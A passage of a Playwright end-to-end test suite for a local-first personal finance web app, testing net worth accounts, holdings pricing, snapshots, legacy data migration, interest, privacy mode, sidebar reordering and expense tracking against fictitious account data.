  const q = await ctx2.newPage(); q.on('pageerror', e => problems.push(`[${cur}] pageerror(v1): ${e.message}`));
  await q.goto(BASE + 'version.json');
  await q.evaluate(async () => {
    const db = await new Promise((res, rej) => { const r = indexedDB.open('ledgerline', 1); r.onupgradeneeded = () => { const d = r.result; for (const c of ['trades', 'tAccounts', 'tTransfers', 'setups', 'days', 'nwAccounts', 'nwSnapshots', 'nwCashflow', 'images']) d.createObjectStore(c, { keyPath: 'id' }); d.createObjectStore('meta', { keyPath: 'key' }); }; r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error); });
    const put = (st, o) => new Promise(res => { const tx = db.transaction(st, 'readwrite'); tx.objectStore(st).put(o); tx.oncomplete = res; });
    await put('tAccounts', { id: 'ta1', name: 'IBKR', startingBalance: 10000, currency: 'USD' });
    await put('tTransfers', { id: 'tr1', accountId: 'ta1', type: 'deposit', amount: 2000, date: '2026-01-02' });
    await put('trades', { id: 't1', accountId: 'ta1', side: 'long', executions: [{ id: 'a', action: 'buy', datetime: '2026-02-01T10:00', qty: 10, price: 100, fee: 1 }, { id: 'b', action: 'sell', datetime: '2026-02-05T10:00', qty: 10, price: 150, fee: 1 }] });
    await put('trades', { id: 't2', accountId: 'ta1', side: 'long', executions: [{ id: 'c', action: 'buy', datetime: '2026-03-01T10:00', qty: 1, price: 100 }] });
    await put('days', { id: '2026-03-01', mood: 4 });
    await put('nwAccounts', { id: 'n1', name: 'Swing capital', kind: 'asset', category: 'trading', currency: 'USD', linkedTradingAccountId: 'ta1' });
    await put('nwAccounts', { id: 'n2', name: 'Bank', kind: 'asset', category: 'cash', currency: 'USD' });
    await put('nwSnapshots', { id: 's1', date: '2026-01-01', balances: { n2: 5000 } });
    await put('nwCashflow', { id: '2026-02', income: 4000, expenses: 2500, currency: 'USD', note: '' });
    await put('meta', { key: 'settings', value: { mode: 'pro', modeChosen: true, tour: { done: true }, tagLists: { tags: ['x'] }, habits: ['y'], lastBackupAt: new Date().toISOString() } });
    db.close();
  });
  await q.goto(BASE + '#/trading/trades'); await sleep(1200);
  assert(q.url().endsWith('#/'), 'old trading page redirects home: ' + q.url());
  const m = await q.evaluate(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js'); const n1 = s.get('nwAccounts', 'n1'); const snap = s.all('nwSnapshots').find(x => x.date === u.today()); return { linked: n1.linkedTradingAccountId, val: snap?.balances?.n1, txns: s.all('txns').map(t => [t.date, t.type, t.amount]), cf: s.all('nwCashflow').length, settings: s.getSettings(), legacy: (await s.readLegacy('trades')).length, days: s.all('days').length }; });
  assert(!m.linked && m.val === 10000 + 2000 + (500 - 2), 'linked account → value recorded (12,498): ' + JSON.stringify(m));
  assert(m.txns.length === 1 && m.txns.some(t => t[1] === 'expense' && t[2] === 2500) && m.cf === 0, 'cash flow → spending only ' + JSON.stringify(m.txns));
  assert(!('tagLists' in m.settings) && m.settings.v1Migrated && Array.isArray(m.settings.habits), 'old trading settings dropped, journal habits kept');
  assert(m.days === 1, 'old journal entries come back: ' + m.days);
  assert(m.legacy === 2, 'old trades left untouched in the database');
  for (const r of ['/', '/networth', '/networth/accounts', '/spending', '/spending/transactions?all=1']) { await q.evaluate(h => { location.hash = h; }, '#' + r); await q.waitForTimeout(400); if (await q.locator('h1:has-text("Something went wrong")').count()) problems.push(`[${cur}] crash after migration on ${r}`); }
  // running again changes nothing
  const again = await q.evaluate(async () => { await (await import('/js/migrate.js')).migrateLegacy(); const s = await import('/js/store.js'); return s.all('txns').length; });
  assert(again === 1, 'migration runs once');
  // full wipe also clears the old stores
  await q.evaluate(async () => { await (await import('/js/store.js')).wipeEverything(); });
  assert(await q.evaluate(async () => (await (await import('/js/store.js')).readLegacy('trades')).length) === 0, 'wipe clears legacy stores');
  await ctx2.close();
  await p.goto(BASE); await sleep(500);
});

await test('networth accounts CRUD', async () => {
  await reset({ mode: 'pro' });
  await go('#/networth/accounts');
  const add = async (fill) => { await p.locator('[data-new]').first().click(); await sleep(250); await fill(); await modalBtn('Save'); };
  await add(async () => { await fillModal('[name=name]', 'Checking EUR'); await p.selectOption('.modal-wrap [name=currency]', 'EUR'); await fillModal('[name=balance]', 1000); });
  await add(async () => { await fillModal('[name=name]', 'HYSA'); await p.selectOption('.modal-wrap [name=category]', 'savings'); await fillModal('[name=apy]', 4.5); await fillModal('[name=balance]', 20000); });
  await add(async () => { await p.selectOption('.modal-wrap [name=kind]', 'liability'); await fillModal('[name=name]', 'Car loan'); await fillModal('[name=rate]', 6); await fillModal('[name=payment]', 300); await fillModal('[name=balance]', 8000); await p.selectOption('.modal-wrap [name=currency]', 'GBP'); });
  // empty name validation
  await p.locator('[data-new]').first().click(); await sleep(250); await modalBtn('Save');
  assert(await p.locator('.modal-wrap').count(), 'modal should stay open without name'); await p.keyboard.press('Escape'); await sleep(200);
  // holdings account
  await p.locator('[data-new]').first().click(); await sleep(250);
  await fillModal('[name=name]', 'Ledger'); await p.selectOption('.modal-wrap [name=category]', 'crypto'); await p.selectOption('.modal-wrap [name=currency]', 'EUR'); await p.check('.modal-wrap [name=tracksHoldings]');
  await modalBtn('Save'); await sleep(300);
  assert((await p.locator('.modal-wrap h2').textContent()).includes('Holdings'), 'holdings editor opens');
  await p.locator('.modal-wrap [data-k=symbol]').first().fill('btc'); await p.locator('.modal-wrap [data-k=qty]').first().fill('0.5');
  await p.locator('.modal-wrap [data-addh]').click(); await sleep(100);
  await p.locator('.modal-wrap [data-k=symbol]').nth(1).fill('xyz'); await p.locator('.modal-wrap [data-k=qty]').nth(1).fill('10'); await p.locator('.modal-wrap [data-k=price]').nth(1).fill('3');
  await p.locator('.modal-wrap [data-addh]').click(); await sleep(100);
  await p.locator('.modal-wrap [data-k=symbol]').nth(2).fill('nope'); await p.locator('.modal-wrap [data-k=qty]').nth(2).fill('1');
  await modalBtn('Save holdings'); await sleep(300);
  await go('#/networth/accounts');
  const st = await S(async () => { const s = await import('/js/store.js'); return { accts: s.all('nwAccounts').map(a => [a.name, a.currency, a.kind, a.category, (a.holdings || []).length, a.apy]), snaps: s.all('nwSnapshots').length }; });
  assert(st.accts.length === 4, 'four accounts: ' + JSON.stringify(st));
  assert(st.accts.find(a => a[0] === 'Car loan')[1] === 'GBP', 'loan in GBP');
  // update prices
  await p.locator('[data-prices]').first().click(); await sleep(800);
  const h = await S(async () => { const s = await import('/js/store.js'); return s.all('nwAccounts').find(a => a.name === 'Ledger').holdings; });
  const btc = h.find(x => x.symbol === 'BTC');
  assert(Math.abs(btc.price - 60000 * 0.9) < 1e-6, 'BTC priced in EUR: ' + btc.price);
  assert(h.find(x => x.symbol === 'XYZ').price === 2.5 * 0.9, 'XYZ via coinbase fallback: ' + h.find(x => x.symbol === 'XYZ').price);
  assert(/NOPE/.test(await toastText()), 'reports not found symbol: ' + await toastText());
  await p.screenshot({ path: SHOTS + 'nw-accounts.png', fullPage: true });
  // edit holdings again: manual price clears source
  await p.locator('[data-hold]').first().click(); await sleep(300);
  await p.locator('.modal-wrap [data-k=price]').first().fill('50000'); await modalBtn('Save holdings'); await sleep(300);
  const h2 = await S(async () => { const s = await import('/js/store.js'); return s.all('nwAccounts').find(a => a.name === 'Ledger').holdings.find(x => x.symbol === 'BTC'); });
  assert(h2.price === 50000 && !h2.priceSource, 'manual price, source cleared: ' + JSON.stringify(h2));
  // edit an account
  await p.locator('tr', { hasText: 'HYSA' }).locator('[data-edit]').click(); await sleep(250);
  await fillModal('[name=apy]', 5); await modalBtn('Save'); await sleep(300);
  // archive + reopen + delete
  const row = () => p.locator('tr', { hasText: 'Checking EUR' });
  await row().locator('[data-arch]').click(); await sleep(400);
  if (await p.locator('.modal-wrap').count()) await modalBtn('Close account').catch(async () => { await p.locator('.modal-wrap footer button.primary, .modal-wrap footer button.danger').last().click(); await sleep(300); });
  await go('#/networth/accounts');
  const arch = await S(async () => { const s = await import('/js/store.js'); return s.all('nwAccounts').find(a => a.name === 'Checking EUR').archivedAt; });
  assert(arch, 'archived');
  await row().locator('[data-arch]').click(); await sleep(400);
  if (await p.locator('.modal-wrap').count()) await p.locator('.modal-wrap footer button').last().click();
  await sleep(300);
  const arch2 = await S(async () => { const s = await import('/js/store.js'); return s.all('nwAccounts').find(a => a.name === 'Checking EUR').archivedAt; });
  assert(!arch2, 'reopened');
  await row().locator('[data-del]').click(); await sleep(250); await p.locator('.modal-wrap footer button').last().click(); await sleep(300);
  const n = await S(async () => (await import('/js/store.js')).all('nwAccounts').length);
  assert(n === 3, 'deleted → 3 accounts, got ' + n);
});

// =============== 3. update balances, snapshot edit/delete, overview/analytics ===============
await test('networth snapshots & charts', async () => {
  await go('#/networth/update');
  const ids = await S(async () => (await import('/js/store.js')).all('nwAccounts').filter(a => !a.tracksHoldings).map(a => [a.id, a.name]));
  // a past snapshot
  await p.fill('#sd', '2026-01-01'); await p.locator('#sd').dispatchEvent('change'); await sleep(400);
  for (const [id] of ids) await p.fill(`[name="${id}"]`, '5000');
  await p.locator('#uf button.primary').click(); await sleep(400);
  await go('#/networth/update?date=2026-01-01');
  assert(await p.locator('text=Editing the existing snapshot').count(), 'existing snapshot recognized');
  await p.fill(`[name="${ids[0][0]}"]`, '6000'); await p.locator('#uf button.primary').click(); await sleep(400);
  await go('#/networth');
  await p.locator('[data-r]').first().click().catch(() => {}); await sleep(300); await check('range click');
  await go('#/networth/analytics'); await go('#/networth/plan'); await go('#/');
  await p.screenshot({ path: SHOTS + 'overview.png', fullPage: true });
  // delete the past snapshot
  await go('#/networth/update?date=2026-01-01');
  await p.locator('[data-del]').click(); await sleep(250); await p.locator('.modal-wrap footer button').last().click(); await sleep(400);
  const snaps = await S(async () => (await import('/js/store.js')).all('nwSnapshots').map(s => s.date));
  assert(!snaps.includes('2026-01-01'), 'snapshot deleted: ' + snaps);
  // yield ticker moves
  await go('#/networth', 300);
  const t1 = await p.locator('[data-earned]').textContent().catch(() => null);
  assert(t1 != null, 'yield ticker present');
});

// =============== 4. cash flow & plan ===============

await test('no Moves; currency view; 0% APY; rows fill the width', async () => {
  await reset({ mode: 'simple', currency: 'USD' });
  await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js'); const bal = {};
    for (const [n, cat, ccy, v, apy] of [['Kraken', 'trading', 'USD', 450000], ['Revolut1', 'savings', 'EUR', 100000, 2], ['UBB', 'savings', 'EUR', 100000], ['Cash', 'cash', 'EUR', 3000]]) { const a = await s.put('nwAccounts', { name: n, kind: 'asset', category: cat, currency: ccy, apy }); bal[a.id] = v; }
    await s.put('nwSnapshots', { date: u.today(), balances: bal }); });
  assert(!(await p.locator('#sidebar a[href="#/networth/moves"]').count()), 'Moves gone from the menu');
  await go('#/networth/moves'); assert(/#\/networth$/.test(p.url()), 'old Moves link goes to Net worth: ' + p.url());
  // own-currency toggle in the accounts table
  const cell = () => p.locator('#main tr', { hasText: 'UBB' }).locator('td.num').first().innerText();
  let c = await cell(); assert(/^\$[\d,]+/.test(c) && /€100,000/.test(c), 'USD first, euros underneath: ' + c);
  await p.locator('[data-native="1"]').click(); await sleep(300);
  c = await cell(); assert(/^€100,000/.test(c) && /≈ \$/.test(c), 'own currency first: ' + c);
  await go('#/'); await go('#/networth'); c = await cell(); assert(/^€100,000/.test(c), 'choice remembered');
  await p.locator('[data-native="0"]').click(); await sleep(200);
  // single snapshot: breakdown instead of an empty chart, interest card instead of an empty debt card
  assert(await p.locator('.breakdown .bd-row').count() === 3, 'type breakdown');
  assert(await p.locator('.card h2', { hasText: /^Interest$/ }).count() === 1 && !(await p.locator('text=No debts recorded.').locator('xpath=..').locator('h2', { hasText: /^Debt$/ }).count()), 'interest card replaces the empty debt card');
  // 0% APY tag on savings only
  await go('#/networth/accounts');
  assert(/0% APY/.test(await p.locator('tr', { hasText: 'UBB' }).innerText()) && !/APY/.test(await p.locator('tr', { hasText: 'Kraken' }).innerText()), '0% APY on savings without a yield');
  const heads = await p.$$eval('.acct-group thead th', t => [...new Set(t.map(x => x.textContent.replace('?', '').trim()))]);
  assert(heads.includes('Yield') && !heads.includes('Institution'), 'Simple: Yield column instead of Institution: ' + heads);
  assert(/2% APY/.test(await p.locator('tr', { hasText: 'Revolut1' }).locator('td').nth(1).innerText()), 'yield in its own column');
  // update balances: grown balances pre-filled with 2 decimals at most
  await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js'); const a = s.all('nwAccounts').find(x => x.name === 'Revolut1'); const sn = s.all('nwSnapshots')[0]; await s.put('nwSnapshots', { ...sn, date: u.dayKey(new Date(Date.now() - 40 * 864e5)) }); });
  await go('#/networth/update');
  const vals = await p.$$eval('#uf input[type=number]', i => i.map(x => x.value));
  assert(vals.every(v => !/\.\d{3,}/.test(v)) && vals.some(v => /\./.test(v)), 'at most 2 decimals: ' + vals);
  // stat rows have no empty columns
  for (const r of ['/', '/networth', '/networth/analytics', '/networth/interest', '/spending']) {
    await go('#' + r, 500);
    const gaps = await p.evaluate(() => [...document.querySelectorAll('#main .stats')].map(g => { const cs = [...g.children].map(x => x.getBoundingClientRect()); const row = cs.filter(x => Math.abs(x.top - cs[0].top) < 2); const right = Math.max(...row.map(x => x.right)); return g.getBoundingClientRect().right - right; }).filter(x => x > 4));
    assert(!gaps.length, `stats row leaves a gap on ${r}: ${gaps}`);
  }
});

await test('sidebar: collapse and reorder sections', async () => {
  await reset({ mode: 'simple' });
  await go('#/spending/budgets');
  const order = () => p.$$eval('#sidebar .nav-section', x => x.map(e => e.dataset.gid));
  const items = gid => p.locator(`#sidebar .nav-section[data-gid=${gid}] .nav-items a`).count();
  assert((await order()).join() === 'networth,spending,journal', 'default order');
  // collapse Net worth: its pages hide; collapse Spending: only the active page stays visible
  await p.locator('[data-toggle=networth]').click(); await sleep(250);
  assert(await items('networth') === 0 && await p.locator('[data-toggle=networth]').getAttribute('aria-expanded') === 'false', 'net worth collapsed');
  await p.locator('[data-toggle=spending]').click(); await sleep(250);
  assert(await items('spending') === 1 && await p.locator('#sidebar .nav-section[data-gid=spending] a.active').count() === 1, 'collapsed section keeps the current page');
  await p.locator('[data-toggle=spending]').click(); await sleep(250);
  assert(await items('spending') === 6, 'expanded again');
  // drag Journal to the top
  const g = p.locator('[data-grip=journal]'), t = p.locator('#sidebar .nav-section[data-gid=networth] .nav-group');
  await p.locator('#sidebar .nav-section[data-gid=journal]').hover();
  const gb = await g.boundingBox(), tb = await t.boundingBox();
  await p.mouse.move(gb.x + gb.width / 2, gb.y + gb.height / 2); await p.mouse.down();
  for (let i = 1; i <= 8; i++) await p.mouse.move(gb.x + gb.width / 2, gb.y + (tb.y - 6 - gb.y) * i / 8);
  await p.mouse.up(); await sleep(300);
  assert((await order()).join() === 'journal,networth,spending', 'dragged journal to the top: ' + await order());
  // keyboard: move Spending up
  await p.locator('[data-grip=spending]').focus(); await p.keyboard.press('ArrowUp'); await sleep(300);
  assert((await order()).join() === 'journal,spending,networth', 'arrow key moves a section: ' + await order());
  // remembered after reload, Overview still first
  await p.reload(); await sleep(700);
  assert((await order()).join() === 'journal,spending,networth' && await items('networth') === 0, 'saved');
  assert(await p.locator('#sidebar .nav > a').first().getAttribute('href') === '#/', 'Overview stays on top');
  // reset from Settings
  await go('#/settings'); await p.locator('[data-act=nav-reset]').click(); await sleep(500);
  assert((await order()).join() === 'networth,spending,journal' && await items('networth') === 6, 'reset');
});

await test('backup reminder off; privacy mode', async () => {
  await reset({ mode: 'simple', currency: 'USD', lastBackupAt: null });
  await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js'); const a = await s.put('nwAccounts', { name: 'Bank', kind: 'asset', category: 'cash', currency: 'EUR' }); await s.put('nwSnapshots', { date: u.today(), balances: { [a.id]: 12345 } }); });
  await p.reload(); await sleep(600);
  assert(await p.locator('.notice', { hasText: 'backed up' }).count() === 1, 'backup reminder shows');
  await p.locator('.notice [data-never]').click(); await sleep(300);
  assert(await S(async () => (await import('/js/store.js')).getSettings().backupReminder) === false, 'never remind saved');
  await p.reload(); await sleep(600);
  assert(await p.locator('.notice', { hasText: 'backed up' }).count() === 0, 'no reminder after "Don\'t remind me"');
  await go('#/settings'); assert(!(await p.locator('#bk-remind').isChecked()), 'settings toggle reflects it');
  await p.locator('#bk-remind').check(); await sleep(300);
  assert(await S(async () => (await import('/js/store.js')).getSettings().backupReminder) === true, 'turned back on in settings');
  // privacy
  await go('#/networth');
  assert(/12,345|13,/.test(await p.locator('#main').innerText()), 'amounts visible normally');
  await p.keyboard.press('h'); await sleep(600);
  let txt = await p.locator('#main').innerText();
  assert(/\$•••/.test(txt) && !/\d{1,3},\d{3}/.test(txt), 'H hides amounts');
  assert(await p.locator('[data-privacy]:visible').first().getAttribute('aria-pressed') === 'true', 'button shows on');
  for (const r of ['/', '/networth/accounts', '/networth/interest', '/spending', '/networth/flows']) { await go('#' + r, 400); txt = await p.locator('#main').innerText(); assert(!/[$€]\s?\d/.test(txt) && !/\d,\d{3}(\.\d\d)? ?€/.test(txt), 'no amounts on ' + r + ': ' + (txt.match(/.{0,20}[$€]\s?\d.{0,10}/) || [''])[0]); }
  await go('#/networth/update'); assert(await p.locator('#uf input[type=number]').first().evaluate(e => getComputedStyle(e).filter).then(f => /blur/.test(f)), 'balance inputs blurred');
  await p.reload(); await sleep(600); assert(await p.evaluate(() => document.body.classList.contains('privacy')), 'privacy remembered');
  await p.locator('[data-privacy]:visible').first().click(); await sleep(600);
  assert(/\d,\d{3}/.test(await p.locator('#main').innerText()), 'button turns it off');
});

await test('money in & out: entries, yearly totals, result, CSV', async () => {
  const fs = await import('fs');
  await reset({ mode: 'simple', currency: 'USD' });
  const yr = String(new Date().getFullYear());
  const ids = await S(async yr => { const s = await import('/js/store.js'); const u = await import('/js/ui.js');
    const etf = await s.put('nwAccounts', { name: 'IBKR', kind: 'asset', category: 'brokerage', currency: 'USD' });
    const ex = await s.put('nwAccounts', { name: 'Kraken', kind: 'asset', category: 'trading', currency: 'USD' });
    const bank = await s.put('nwAccounts', { name: 'Bank', kind: 'asset', category: 'cash', currency: 'USD' });
    await s.put('nwSnapshots', { date: `${+yr - 1}-12-20`, balances: { [etf.id]: 10000, [ex.id]: 5000, [bank.id]: 3000 } });
    await s.put('nwSnapshots', { date: u.today(), balances: { [etf.id]: 13000, [ex.id]: 4000 } });
    return { etf: etf.id, ex: ex.id, bank: bank.id }; }, yr);
  await go('#/networth/flows');
  assert(await p.locator('#sidebar a[href="#/networth/flows"]').count() === 1, 'in the menu');
  const rowsN = await p.locator('#main table tbody tr').count();
  assert(rowsN === 2, 'investment + trading accounts listed even without entries: ' + rowsN);
  // deposit 2000 into IBKR (no balance change), withdraw 1500 from Kraken
  await p.locator('[data-new]').first().click(); await sleep(300);
  await p.selectOption('.modal-wrap [name=accountId]', ids.etf); await fillModal('[name=amount]', '2000'); await fillModal('[name=date]', `${yr}-02-10`); await fillModal('[name=note]', 'ETF buy');
  assert(!(await p.locator('.modal-wrap [name=adjust]').isChecked()), 'balance change is off by default');
  await modalBtn('Save'); await sleep(400);
  await p.locator('[data-new]').first().click(); await sleep(300);
  await p.locator('.modal-wrap [data-dir=out]').click(); await p.selectOption('.modal-wrap [name=accountId]', ids.ex); await fillModal('[name=amount]', '1500'); await fillModal('[name=date]', `${yr}-03-05`);
  await modalBtn('Save'); await sleep(400);
  const stats = await p.locator('#main .stats').innerText();
  assert(/\$2,000/.test(stats) && /\$1,500/.test(stats) && /\+\$500/.test(stats), 'totals: ' + stats);
  // result: IBKR 13000 − 10000 − 2000 = +1000; Kraken 4000 − 5000 + 1500 = +500 → +1500
  const res = await p.locator('.stat', { has: p.locator('.stat-label', { hasText: 'Result on top' }) }).innerText();
  assert(/\+\$1,500/.test(res), 'result = value change − money moved: ' + res);
  // bank only appears once it has an entry; with "change balance" it adjusts today's balance
  await p.locator('[data-new]').first().click(); await sleep(300);
  await p.selectOption('.modal-wrap [name=accountId]', ids.bank); await fillModal('[name=amount]', '100'); await p.check('.modal-wrap [name=adjust]');
  await modalBtn('Save'); await sleep(400);
  const bank = await S(async id => { const N = await import('/js/networth/calc.js'); const u = await import('/js/ui.js'); return N.pointAt(u.today()).byAcctNative[id]; }, ids.bank);
  assert(bank === 3100 && await p.locator('#main table tbody tr', { hasText: 'Bank' }).count() === 1, 'balance adjusted, bank listed: ' + bank);
  // edit → delete reverses the balance change
  await p.locator('.flow-row', { hasText: 'Bank' }).click(); await sleep(300); await modalBtn('Delete'); await sleep(250); await p.locator('.modal-wrap footer button').last().click(); await sleep(400);
  assert(await S(async id => { const N = await import('/js/networth/calc.js'); const u = await import('/js/ui.js'); return N.pointAt(u.today()).byAcctNative[id]; }, ids.bank) === 3000, 'delete restores the balance');
  // CSV
  const [dl] = await Promise.all([p.waitForEvent('download'), p.locator('[data-csv]').click()]);
  const csv = fs.readFileSync(await dl.path(), 'utf8');
  assert(/^date,account,type,amount/.test(csv) && /"IBKR",deposit,2000/.test(csv) && /"Kraken",withdrawal,1500/.test(csv) && /money_in,money_out/.test(csv), 'csv: ' + csv.slice(0, 200));
  // another year is empty
  await go(`#/networth/flows?y=${+yr - 1}`); assert(/\$0/.test(await p.locator('.stat', { has: p.locator('.stat-label', { hasText: /^Put in/ }) }).innerText()), 'previous year has nothing');
});

await test('interest: per account, since update, APY history, idle cash, debts', async () => {
  await reset({ mode: 'pro', currency: 'USD' });
  const r = await S(async () => { const s = await import('/js/store.js'); const N = await import('/js/networth/calc.js'); const u = await import('/js/ui.js');
    const d = n => u.dayKey(new Date(Date.now() - n * 864e5));
    const a = await s.put('nwAccounts', { name: 'HYSA', kind: 'asset', category: 'savings', currency: 'USD', apy: 4, apyHistory: [{ from: '0000-01-01', apy: 5 }, { from: d(100), apy: 4 }] });
    const c = await s.put('nwAccounts', { name: 'Checking', kind: 'asset', category: 'cash', currency: 'USD' });
    const l = await s.put('nwAccounts', { name: 'Loan', kind: 'liability', category: 'personal', currency: 'USD', rate: 12 });
    await s.put('nwSnapshots', { date: d(200), balances: { [a.id]: 10000, [c.id]: 3000, [l.id]: 6000 } });
    await s.put('nwSnapshots', { date: d(50), balances: { [a.id]: 12000 } });
    const e = N.interestEarned(a, { yearStart: '0000-01-01' }), io = N.interestOverview();
    const exp1 = 10000 * (Math.pow(1.05, 150 / 365) - 1), exp2 = 12000 * (Math.pow(1.04, 50 / 365) - 1);
    return { total: e.total, exp: exp1 + exp2, since: e.sinceUpdate, exp2, apyAtOld: N.apyAt(a, d(150)), apyAtNew: N.apyAt(a, d(10)), month: io.earnMonth, pay: io.payMonth, idle: io.idle.map(x => x.a.name), blended: io.blended };
  });
  assert(Math.abs(r.total - r.exp) < 0.01 && Math.abs(r.since - r.exp2) < 0.01, 'interest earned uses the APY in force per period ' + JSON.stringify(r));
  assert(r.apyAtOld === 5 && r.apyAtNew === 4, 'apyAt ' + JSON.stringify(r));
  assert(Math.abs(r.pay - 60) < 1e-9 && r.idle.join() === 'Checking' && Math.abs(r.blended - 0.04) < 1e-9, 'debts cost, idle cash, blended ' + JSON.stringify(r));
  await go('#/networth/interest');
  assert(await p.locator('tbody tr', { hasText: 'HYSA' }).count() === 1 && await p.locator('#i-proj').count() === 1, 'interest page table + projection');
  assert(await p.locator('.card', { hasText: 'Not earning anything' }).locator('dt', { hasText: 'Checking' }).count() === 1, 'idle cash listed');
  // changing the APY in the form records history
  await go('#/networth/accounts');
  await p.locator('tr', { hasText: 'Checking' }).locator('[data-edit]').click(); await sleep(250); await fillModal('[name=apy]', '1.5'); await modalBtn('Save'); await sleep(300);
  const h = await S(async () => (await import('/js/store.js')).all('nwAccounts').find(a => a.name === 'Checking').apyHistory);
  assert(h?.length === 1 && h[0].apy === 1.5, 'apy history recorded ' + JSON.stringify(h));
  await go('#/'); assert(/\$/.test(await p.locator('.stat', { has: p.locator('.stat-label', { hasText: 'Interest / month' }) }).textContent()), 'interest on overview');
});

await test('expenses taken off an account balance', async () => {
  await reset({ mode: 'simple', currency: 'EUR' });
  const ids = await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js');
    const a = await s.put('nwAccounts', { name: 'Revolut', kind: 'asset', category: 'cash', currency: 'EUR' });
    const usd = await s.put('nwAccounts', { name: 'US bank', kind: 'asset', category: 'cash', currency: 'USD' });
    const cc = await s.put('nwAccounts', { name: 'Amex', kind: 'liability', category: 'otherdebt', currency: 'EUR' });
    const h = await s.put('nwAccounts', { name: 'Wallet', kind: 'asset', category: 'crypto', currency: 'USD', tracksHoldings: true, holdings: [] });
    await s.put('nwSnapshots', { date: u.dayKey(new Date(Date.now() - 20 * 864e5)), balances: { [a.id]: 1000, [usd.id]: 1000, [cc.id]: 100 } });
    return { a: a.id, usd: usd.id, cc: cc.id, h: h.id }; });
  const bal = id => S(async id => { const N = await import('/js/networth/calc.js'); const u = await import('/js/ui.js'); return Math.round(N.pointAt(u.today()).byAcctNative[id] * 100) / 100; }, id);
  await go('#/spending'); await openAdd();
  const vis = await p.$$eval('.modal-wrap [name]', els => [...new Set(els.filter(e => !e.closest('[hidden]') && e.type !== 'hidden').map(e => e.name))]);
  assert(JSON.stringify(vis) === JSON.stringify(['amount', 'currency', 'date', 'category', 'note', 'accountId']), 'simple form has the account picker: ' + vis);
  await fillTxn({ amount: 50, ccy: 'EUR', cat: 'groceries', note: 'Lidl' });
  await p.selectOption('.modal-wrap [name=accountId]', ids.a); await sleep(100);
  assert(await p.locator('.modal-wrap .deductf').isVisible(), 'deduct option appears once an account is picked');
  await p.check('.modal-wrap [name=deduct]'); await modalBtn('Save'); await sleep(400);
  assert(await bal(ids.a) === 950 && /Revolut is now/.test(await toastText()), 'balance dropped: ' + await bal(ids.a));
  // edit amount → adjusted, change account → moved, delete → restored
  await go('#/spending/transactions'); await p.locator('.txn', { hasText: 'Lidl' }).click(); await sleep(300);
  assert(await p.inputValue('.modal-wrap [name=accountId]') === ids.a && await p.locator('.modal-wrap [name=deduct]').isChecked(), 'edit shows account + deduct');
  await fillModal('[name=amount]', '80'); await modalBtn('Save'); await sleep(400);
  assert(await bal(ids.a) === 920, 'edited amount adjusted: ' + await bal(ids.a));
  await p.locator('.txn', { hasText: 'Lidl' }).click(); await sleep(300); await p.selectOption('.modal-wrap [name=accountId]', ids.usd); await modalBtn('Save'); await sleep(400);
  const usdBal = await bal(ids.usd);
  assert(await bal(ids.a) === 1000 && usdBal < 1000 && usdBal > 880, 'moved to the USD account, converted: ' + usdBal);
  await p.locator('.txn', { hasText: 'Lidl' }).click(); await sleep(300); await modalBtn('Delete'); await sleep(400);
  assert(await bal(ids.usd) === 1000, 'delete restores the balance');
  // credit card: owe more
  await openAdd(); await fillTxn({ amount: 30, ccy: 'EUR', cat: 'dining', note: 'Dinner' }); await p.selectOption('.modal-wrap [name=accountId]', ids.cc); await sleep(100);
  assert(/owe/.test(await p.locator('.modal-wrap #dd-hint').textContent()), 'debt hint');
  await p.check('.modal-wrap [name=deduct]'); await modalBtn('Save'); await sleep(400);
  assert(await bal(ids.cc) === 130, 'card owes more: ' + await bal(ids.cc));
  // holdings account can't be adjusted
  await openAdd(); await p.selectOption('.modal-wrap [name=accountId]', ids.h); await sleep(100);
  assert(await p.locator('.modal-wrap [name=deduct]').isDisabled(), 'holdings account: deduct disabled'); await p.keyboard.press('Escape'); await sleep(200);
  // without the tick nothing changes
  await openAdd(); await fillTxn({ amount: 10, ccy: 'EUR', cat: 'dining', note: 'Coffee' }); await p.selectOption('.modal-wrap [name=accountId]', ids.a); await p.uncheck('.modal-wrap [name=deduct]'); await modalBtn('Save'); await sleep(400);
  assert(await bal(ids.a) === 1000, 'label only without the tick');
  // subscription that updates the balance on each charge
  await go('#/spending/recurring'); await p.locator('[data-new=sub]').first().click(); await sleep(300);
  await fillModal('[name=name]', 'Spotify'); await fillModal('[name=amount]', '11'); await p.selectOption('.modal-wrap [name=currency]', 'EUR');
  await fillModal('[name=next]', await S(async () => (await import('/js/ui.js')).today())); await p.selectOption('.modal-wrap [name=accountId]', ids.a); await sleep(100);
  await p.check('.modal-wrap [name=deduct]'); await modalBtn('Save'); await sleep(500);
  assert(await bal(ids.a) === 989, 'subscription charge taken off: ' + await bal(ids.a));
  await go('#/spending/transactions'); const st = await p.locator('.stat', { has: p.locator('.stat-label', { hasText: 'Paid from tracked' }) }).textContent();
  assert(/41\.00/.test(st) && /2 of 3/.test(st), 'transactions stat counts deducted: ' + st + ' ' + JSON.stringify((await txs()).map(t => [t.note, t.deducted])));
});

await test('accounts grouped by type; single-snapshot net worth page', async () => {
  await reset({ mode: 'simple', currency: 'USD' });
  await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js'); const bal = {};
    for (const [n, cat, kind, v] of [['Bank A', 'cash', 'asset', 500], ['Bank B', 'cash', 'asset', 1500], ['HYSA', 'savings', 'asset', 9000], ['Bybit', 'trading', 'asset', 4000], ['ETF', 'brokerage', 'asset', 7000], ['Pension', 'retirement', 'asset', 3000], ['Loan', 'personal', 'liability', 2000]]) { const a = await s.put('nwAccounts', { name: n, category: cat, kind, currency: 'USD' }); bal[a.id] = v; }
    await s.put('nwSnapshots', { date: u.today(), balances: bal });
    await s.saveSettings({ estimates: { currency: 'USD', spending: 2000, nwYearAgo: 15000 } }); });
  await go('#/networth/accounts');
  const groups = await p.$$eval('.acct-group h2', h => h.map(x => x.textContent.trim()));
  assert(groups.join() === 'Savings,Investments,Trading capital,Cash,Debt', 'simple groups in order: ' + groups);
  const inv = await p.locator('#grp-investments tbody tr').allTextContents();
  assert(inv.length === 2 && /ETF/.test(inv[0]), 'biggest first inside a group');
  assert(/1,000|10,000|\$10/.test(await p.locator('#grp-investments .card-head').textContent()), 'group total');
  await go('#/networth/update');
  const legends = await p.$$eval('#uf legend', l => l.map(x => x.textContent.trim()));
